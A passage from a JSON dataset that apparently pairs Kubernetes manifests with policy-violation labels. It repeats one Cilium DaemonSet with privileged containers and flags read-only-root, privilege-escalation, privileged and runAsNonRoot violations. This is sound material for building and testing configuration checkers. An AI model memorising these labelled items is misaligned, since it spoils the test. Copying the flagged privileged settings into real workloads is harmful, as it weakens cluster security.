/var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"clean-cilium-state\" does not have a read-only root file system"
  },
  {
    "id": "03989",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"cilium-agent\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "03990",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"clean-cilium-state\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "03991",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"cilium-agent\" is privileged"
  },
  {
    "id": "03992",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"clean-cilium-state\" is privileged"
  },
  {
    "id": "03993",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cilium-agent\" is not set to runAsNonRoot"
  },
  {
    "id": "03994",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
